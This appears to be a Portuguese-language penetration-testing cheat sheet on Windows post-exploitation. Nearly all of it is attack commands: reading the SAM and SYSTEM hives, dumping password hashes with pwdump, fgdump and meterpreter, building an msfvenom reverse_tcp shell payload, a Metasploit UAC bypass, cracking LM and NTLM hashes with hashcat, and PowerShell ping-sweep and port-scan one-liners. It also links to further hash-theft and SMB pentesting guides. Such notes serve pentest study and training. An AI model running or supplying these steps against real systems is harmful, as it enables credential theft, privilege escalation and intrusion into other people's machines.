# post-exploitation

## Nomes de usuários e hashs de senha no Windows XP 
```bash
    SAM: C:\Windows\System32\config\SAM
    SYSTEM: C:\Windows\System32\config\SYSTEM

    Comando equivalente no meterpreter: hashdump 
```

### Obtendo nomes de usuários e hashes de senhas no Windows XP através dos arquivos de backup
```bash
    SAM: C:\Windows\repair\SAM
    SYSTEM: C:\Windows\repair\SYSTEM
```

### Dumping de hashs 
```bash
    pwdump system sam 
```

## Ferramentas do kali para pós-exploração 

### FGDUMP
```bash
    /usr/share/windows-binaries/fgdump/fgdump.exe
    meterpreter > shell 
    meterpreter > fgdump
    meterpreter > type 127.0.0.1.pwdump 
    meterpreter > type 127.0.0.1.cachetedump
```

### WCE

![screenshot](https://github.com/robertocoliver/post-exploitation/assets/102238044/bc68909b-55ef-4fc2-b01e-046787025053)


## Bypass UAC ( Windows 7 em diante ) pelo meterpreter
#### Payload TCP/IP
```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f exe > shell.exe
```
#### Procure pelo exploit bypass UAC
```bash
    background
    search bypassuac 
    msf5 > use exploit/windows/local/bypassuac
```
#### Configure um novo payload na sessão 
```bash
    msf5 exploit(windows/local/bypassuac) > set payload windows/x64/meterpreter/reverse_tcp
```
## Dumping de senhas no windowss ( bypass ) 
```bash
    search hashdump 
    use post/windows/gather/smart_hashdump 
```
## crack de senha do windows  
```bash
    hash-identifier <hash>
    hashcat -m 3000  LM
    hashcat -m 1000  NTHash 
    NTLMv1 hashcat -m 5500 NTLMv1 
```

## Power Shell Ping Sweep
```bash
    1..255 | ForEach-Object { echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl }
```
## Power Shell port Scan 
```bash
    1..1024 | ForEach-Object { echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "Port $_ open!"} 2>$null

```
## Acessando o SMB
```bash
    smbclient -L //IP -U user 
```

## Artigos sobre pós-exploração 
[Getting Windows passwords in plain text via memory — the updated guide](https://medium.com/@viniciuskmax/obtendo-senhas-e-hashes-do-windows-via-mem%C3%B3ria-e-registro-o-guia-atualizado-b4e67edd4823)<br />
[Windows-Post-Exploitation](https://github.com/emilyanncr/Windows-Post-Exploitation)

## crack de senhas 
[Quebrando senhas](https://segurancadecomputadores.wordpress.com/2023/03/02/quebrando-senhas/)

## Pentesting SMB
[Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

